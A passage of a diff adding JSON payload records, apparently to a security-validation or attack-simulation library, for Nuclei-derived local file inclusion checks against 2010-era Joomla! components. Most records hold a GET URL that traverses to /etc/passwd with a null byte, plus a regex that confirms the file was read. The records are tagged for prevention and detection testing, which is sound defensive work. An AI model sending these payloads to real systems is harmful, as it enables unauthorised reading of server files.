+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_preventive&controller==../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component AlphaUserPoints 1.5.5 - Local File Inclusion (Nuclei: CVE-2010-1476)",
+    "payload_external_id": "B8-LFI-071",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1476 by daffainfo] A directory traversal vulnerability in the AlphaUserPoints (com_alphauserpoints) component 1.5.5 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_alphauserpoints&view=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Jfeedback 1.2 - Local File Inclusion (Nuclei: CVE-2010-1478)",
+    "payload_external_id": "B8-LFI-072",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1478 by daffainfo] A directory traversal vulnerability in the Ternaria Informatica Jfeedback! (com_jfeedback) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jfeedback&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component MMS Blog 2.3.0 - Local File Inclusion (Nuclei: CVE-2010-1491)",
+    "payload_external_id": "B8-LFI-073",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1491 by daffainfo] A directory traversal vulnerability in the MMS Blog (com_mmsblog) component 2.3.0 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_mmsblog&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component AWDwall 1.5.4 - Local File Inclusion (Nuclei: CVE-2010-1494)",
+    "payload_external_id": "B8-LFI-074",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1494 by daffainfo] A directory traversal vulnerability in the AWDwall (com_awdwall) component 1.5.4 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_awdwall&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Matamko 1.01 - Local File Inclusion (Nuclei: CVE-2010-1495)",
+    "payload_external_id": "B8-LFI-075",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1495 by daffainfo] A directory traversal vulnerability in the Matamko (com_matamko) component 1.01 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_matamko&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component redSHOP 1.0 - Local File Inclusion (Nuclei: CVE-2010-1531)",
+    "payload_external_id": "B8-LFI-076",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1531 by daffainfo] A directory traversal vulnerability in the redSHOP (com_redshop) component 1.0.x for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_redshop&view=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component PowerMail Pro 1.5.3 - Local File Inclusion (Nuclei: CVE-2010-1532)",
+    "payload_external_id": "B8-LFI-077",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1532 by daffainfo] A directory traversal vulnerability in the givesight PowerMail Pro (com_powermail) component 1.5.3 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component TweetLA 1.0.1 - Local File Inclusion (Nuclei: CVE-2010-1533)",
+    "payload_external_id": "B8-LFI-078",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1533 by daffainfo] A directory traversal vulnerability in the TweetLA (com_tweetla) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_tweetla&controller=../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Shoutbox Pro - Local File Inclusion (Nuclei: CVE-2010-1534)",
+    "payload_external_id": "B8-LFI-079",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1534 by daffainfo] A directory traversal vulnerability in the Shoutbox Pro (com_shoutbox) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_shoutbox&controller=../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component TRAVELbook 1.0.1 - Local File Inclusion (Nuclei: CVE-2010-1535)",
+    "payload_external_id": "B8-LFI-080",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1535 by daffainfo] A directory traversal vulnerability in the TRAVELbook (com_travelbook) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_travelbook&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_blog - Directory Traversal (Nuclei: CVE-2010-1540)",
+    "payload_external_id": "B8-LFI-081",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1540 by daffainfo] A directory traversal vulnerability in index.php in the MyBlog (com_myblog) component 3.0.329 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the task parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_myblog&Itemid=1&task=../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JA Comment - Local File Inclusion (Nuclei: CVE-2010-1601)",
+    "payload_external_id": "B8-LFI-082",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1601 by daffainfo] A directory traversal vulnerability in the JA Comment (com_jacomment) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jacomment&view=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component ZiMB Comment 0.8.1 - Local File Inclusion (Nuclei: CVE-2010-1602)",
+    "payload_external_id": "B8-LFI-083",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1602 by daffainfo] A directory traversal vulnerability in the ZiMB Comment (com_zimbcomment) component 0.8.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_zimbcomment&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component ZiMBCore 0.1 - Local File Inclusion (Nuclei: CVE-2010-1603)",
+    "payload_external_id": "B8-LFI-084",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1603 by daffainfo] A directory traversal vulnerability in the ZiMB Core (aka ZiMBCore or com_zimbcore) component 0.1 in the ZiMB Manager collection for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_zimbcore&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component WMI 1.5.0 - Local File Inclusion (Nuclei: CVE-2010-1607)",
+    "payload_external_id": "B8-LFI-085",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1607 by daffainfo] A directory traversal vulnerability in wmi.php in the Webmoney Web Merchant Interface (aka WMI or com_wmi) component 1.5.0 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_wmi&controller=../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Graphics 1.0.6 - Local File Inclusion (Nuclei: CVE-2010-1653)",
+    "payload_external_id": "B8-LFI-086",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1653 by daffainfo] A directory traversal vulnerability in graphics.php in the Graphics (com_graphics) component 1.0.6 and 1.5.0 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_graphics&controller=../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component SmartSite 1.0.0 - Local File Inclusion (Nuclei: CVE-2010-1657)",
+    "payload_external_id": "B8-LFI-087",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1657 by daffainfo] A directory traversal vulnerability in the SmartSite (com_smartsite) component 1.0.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_smartsite&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component NoticeBoard 1.3 - Local File Inclusion (Nuclei: CVE-2010-1658)",
+    "payload_external_id": "B8-LFI-088",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1658 by daffainfo] A directory traversal vulnerability in the Code-Garage NoticeBoard (com_noticeboard) component 1.3 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_noticeboard&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Ultimate Portfolio 1.0 - Local File Inclusion (Nuclei: CVE-2010-1659)",
+    "payload_external_id": "B8-LFI-089",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1659 by daffainfo] A directory traversal vulnerability in the Ultimate Portfolio (com_ultimateportfolio) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_ultimateportfolio&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Arcade Games 1.0 - Local File Inclusion (Nuclei: CVE-2010-1714)",
+    "payload_external_id": "B8-LFI-090",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1714 by daffainfo] A directory traversal vulnerability in the Arcade Games (com_arcadegames) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_arcadegames&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Online Exam 1.5.0 - Local File Inclusion (Nuclei: CVE-2010-1715)",
+    "payload_external_id": "B8-LFI-091",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1715 by daffainfo] A directory traversal vulnerability in the Online Examination (aka Online Exam or com_onlineexam) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component iF surfALERT 1.2 - Local File Inclusion (Nuclei: CVE-2010-1717)",
+    "payload_external_id": "B8-LFI-092",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1717 by daffainfo] A directory traversal vulnerability in the iF surfALERT (com_if_surfalert) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_if_surfalert&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Archery Scores 1.0.6 - Local File Inclusion (Nuclei: CVE-2010-1718)",
+    "payload_external_id": "B8-LFI-093",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1718 by daffainfo] A directory traversal vulnerability in archeryscores.php in the Archery Scores (com_archeryscores) component 1.0.6 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
